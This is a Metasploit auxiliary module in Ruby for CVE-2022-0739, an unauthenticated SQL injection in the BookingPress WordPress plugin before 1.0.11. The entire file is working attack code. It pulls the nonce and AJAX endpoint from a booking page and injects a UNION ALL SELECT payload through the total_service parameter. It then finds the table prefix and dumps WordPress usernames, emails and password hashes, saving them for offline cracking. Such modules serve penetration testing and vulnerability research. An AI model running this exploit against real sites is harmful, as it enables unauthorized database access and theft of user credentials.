##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
  prepend Msf::Exploit::Remote::AutoCheck

  NONCE_NOT_FOUND_ERROR_MSG = 'Unable to get wp-nonce as an unauthenticated user'.freeze
  class RequestError < StandardError
    attr_reader :failure

    def initialize(failure, message)
      @failure = failure
      super(message)
    end
  end

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress BookingPress bookingpress_front_get_category_services SQLi',
        'Description' => %q{
          The BookingPress WordPress plugin before 1.0.11 fails to properly sanitize user supplied data
          in the `total_service` parameter of the `bookingpress_front_get_category_services` AJAX action
          (available to unauthenticated users), prior to using it in a dynamically constructed SQL query.
          As a result, unauthenticated attackers can conduct an SQL injection attack to dump sensitive
          data from the backend database such as usernames and password hashes.

          This module uses this vulnerability to dump the list of WordPress users and their associated
          email addresses and password hashes for cracking offline.
        },
        'Author' => [
          'cydave', # Of cyllective. Discovery of bug.
          'destr4ct', # PoC Code for exploiting the bug.
          'jheysel-r7' # Metasploit module
        ],
        'References' => [
          [ 'URL', 'https://github.com/destr4ct/CVE-2022-0739'],
          [ 'WPVDB', '388cd42d-b61a-42a4-8604-99b812db2357'],
          [ 'CVE', '2022-0739']
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2022-02-28',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [ true, 'The URL of the BookingPress appointment booking page', '/bookingpress/' ])
    ])
  end

  def check
    prepare_sqli
    return Exploit::CheckCode::Vulnerable('SQL injection test succeeded') if @sqli.test_vulnerable

    Exploit::CheckCode::Safe('SQL injection test did not succeed')
  rescue RequestError => e
    e.failure == Failure::NotVulnerable ? Exploit::CheckCode::Safe(e.message) : Exploit::CheckCode::Unknown(e.message)
  rescue URI::InvalidURIError, Msf::OptionValidateError => e
    elog('Invalid BookingPress URL configuration', error: e)
    Exploit::CheckCode::Unknown('BookingPress URL configuration is invalid')
  rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
    elog('BookingPress SQL injection check failed to connect', error: e)
    Exploit::CheckCode::Unknown('BookingPress request failed to connect or complete')
  end

  def generate_vars_post(sqli)
    {
      'action' => 'bookingpress_front_get_category_services',
      '_wpnonce' => @nonce,
      'category_id' => 1,
      'total_service' => "#{rand(100..10000)}#{sqli}"
    }
  end

  def get_sqli_object
    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true, encoder: :hex, safe: true }) do |payload|
      # UNION SELECT needs no FROM table, so the probe works before discovering
      # the installation's actual WordPress database prefix.
      res = send_request_cgi(
        'method' => 'POST',
        'uri' => @ajax_uri,
        'vars_post' => generate_vars_post(") UNION ALL SELECT (#{payload}),456,789,12,34,56,78,90,77-- -")
      )
      raise RequestError.new(Failure::Unreachable, 'BookingPress SQL request did not receive a response') unless res
      if [401, 403].include?(res.code)
        raise RequestError.new(Failure::NoAccess, "BookingPress SQL request was denied (HTTP #{res.code})")
      end
      raise RequestError.new(Failure::UnexpectedReply, "BookingPress SQL request returned HTTP #{res.code}") unless res.code == 200

      document = res.get_json_document
      if document.is_a?(Hash) && document['variant'] == 'error'
        raise RequestError.new(Failure::NoAccess, 'BookingPress rejected the SQL request; the nonce may have expired')
      end
      unless document.is_a?(Array)
        raise RequestError.new(Failure::UnexpectedReply, 'BookingPress SQL response was not a service-result array')
      end

      if document.empty?
        next nil if @query_operation == :prefix

        failure = @query_operation == :dump ? Failure::UnexpectedReply : Failure::NotVulnerable
        raise RequestError.new(failure, 'SQL injection test did not return a result')
      end
      row = document.first
      unless row.is_a?(Hash) && row.key?('bookingpress_service_id')
        raise RequestError.new(Failure::UnexpectedReply, 'BookingPress SQL response did not include a service ID')
      end

      value = row['bookingpress_service_id']
      # A missing table in a scalar subquery produces SQL NULL. Prefix
      # discovery must receive nil, not empty text coerced to indicator zero.
      if value.nil? || value == ''
        next nil unless @query_operation == :dump

        raise RequestError.new(Failure::UnexpectedReply, 'BookingPress user extraction returned an empty scalar')
      end
      unless value.is_a?(String) || value.is_a?(Integer)
        raise RequestError.new(Failure::UnexpectedReply, 'BookingPress SQL response included an invalid service ID')
      end

      value.to_s
    end
  end

  def get_user_nonce
    page = URI.join(full_uri('/'), target_uri.to_s)
    raise RequestError.new(Failure::BadConfig, 'TARGETURI must identify an HTTP booking page') unless page.is_a?(URI::HTTP)

    res = send_request_cgi('method' => 'POST', 'uri' => page.request_uri)
    raise RequestError.new(Failure::Unreachable, 'BookingPress booking page did not receive a response') unless res
    if [401, 403].include?(res.code)
      raise RequestError.new(Failure::NoAccess, "BookingPress booking page was denied (HTTP #{res.code})")
    end
    raise RequestError.new(Failure::UnexpectedReply, "BookingPress booking page returned HTTP #{res.code}") unless res.code == 200

    scripts = res.get_html_document.css('script').map(&:text).join("\n")
    nonce = scripts[/\b_wpnonce\s*:\s*['"](\w+)['"]/, 1]
    raise RequestError.new(Failure::UnexpectedReply, NONCE_NOT_FOUND_ERROR_MSG) unless nonce

    # This is embedded JSON, not the HTTP response document. WordPress may
    # advertise another canonical host; only use its path on our configured
    # HTTP transport, never follow a page-supplied host.
    settings = scripts[/\b(?:var|let|const)\s+appoint_ajax_obj\s*=\s*({.*?})\s*;/m, 1]
    config = settings && JSON.parse(settings)
    unless config.is_a?(Hash) && config['ajax_url'].is_a?(String)
      raise RequestError.new(Failure::UnexpectedReply, 'BookingPress booking page did not include AJAX settings')
    end

    ajax = URI.join(page.to_s, config['ajax_url'])
    unless ajax.is_a?(URI::HTTP) && ajax.path.end_with?('/wp-admin/admin-ajax.php')
      raise RequestError.new(Failure::UnexpectedReply, 'BookingPress booking page included an invalid AJAX endpoint')
    end

    @ajax_uri = ajax.request_uri
    nonce
  rescue JSON::ParserError => e
    elog('Invalid BookingPress embedded AJAX settings', error: e)
    raise RequestError.new(Failure::UnexpectedReply, 'BookingPress booking page returned invalid AJAX settings')
  end

  def run
    # Machine-consumed by tools/dev/update_wordpress_vulnerabilities.rb.
    # check_plugin_version_from_readme('bookingpress-appointment-booking', '1.0.11')
    prepare_sqli
    raise RequestError.new(Failure::NotVulnerable, 'SQL injection test did not succeed') unless @sqli.test_vulnerable

    @query_operation = :prefix
    @prefix = wordpress_sqli_identify_table_prefix
    unless @prefix.is_a?(String) && @prefix.match?(/\A[a-zA-Z0-9_]+\z/)
      raise RequestError.new(Failure::UnexpectedReply, 'Unable to identify the WordPress database table prefix')
    end

    print_status('Extracting credential information')
    @query_operation = :dump
    users = @sqli.dump_table_fields("#{@prefix}users", %w[user_login user_email user_pass])
    unless users.is_a?(Array)
      raise RequestError.new(Failure::UnexpectedReply, 'BookingPress did not return WordPress user rows')
    end

    users = users.map do |row|
      unless row.is_a?(Array) && row.length == 3 && row.all? { |field| field.is_a?(String) }
        raise RequestError.new(Failure::UnexpectedReply, 'BookingPress returned a malformed WordPress user row')
      end

      row.map do |field|
        text = field.dup.force_encoding(::Encoding::UTF_8)
        raise RequestError.new(Failure::UnexpectedReply, 'BookingPress returned invalid UTF-8 user data') unless text.valid_encoding?

        text
      end
    end
    creds_table = Rex::Text::Table.new('Header' => 'Wordpress User Credentials', 'Indent' => 1, 'Columns' => ['Username', 'Email', 'Hash'])
    users.each do |username, email, hash|
      creds_table << [username, email, hash]
      next if hash.empty?

      create_credential(
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: username,
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
        private_data: hash,
        service_name: 'WordPress BookingPress Plugin',
        address: rhost,
        port: rport,
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED,
        email: email
      )
    end
    print_line(creds_table.to_s)
  rescue RequestError => e
    case e.failure
    when Failure::Unreachable
      fail_with(Failure::Unreachable, e.message)
    when Failure::NoAccess
      fail_with(Failure::NoAccess, e.message)
    when Failure::NotVulnerable
      fail_with(Failure::NotVulnerable, e.message)
    when Failure::BadConfig
      fail_with(Failure::BadConfig, e.message)
    else
      fail_with(Failure::UnexpectedReply, e.message)
    end
  rescue URI::InvalidURIError, Msf::OptionValidateError => e
    elog('Invalid BookingPress URL configuration', error: e)
    fail_with(Failure::BadConfig, 'BookingPress URL configuration is invalid')
  rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
    elog('BookingPress credential collection failed to connect', error: e)
    fail_with(Failure::Unreachable, 'BookingPress request failed to connect or complete')
  end

  private

  def prepare_sqli
    # Never reuse a nonce, endpoint or callback from an earlier target/run.
    @nonce = @ajax_uri = @sqli = @prefix = nil
    @query_operation = :probe
    @nonce = get_user_nonce
    @sqli = get_sqli_object
  end
end
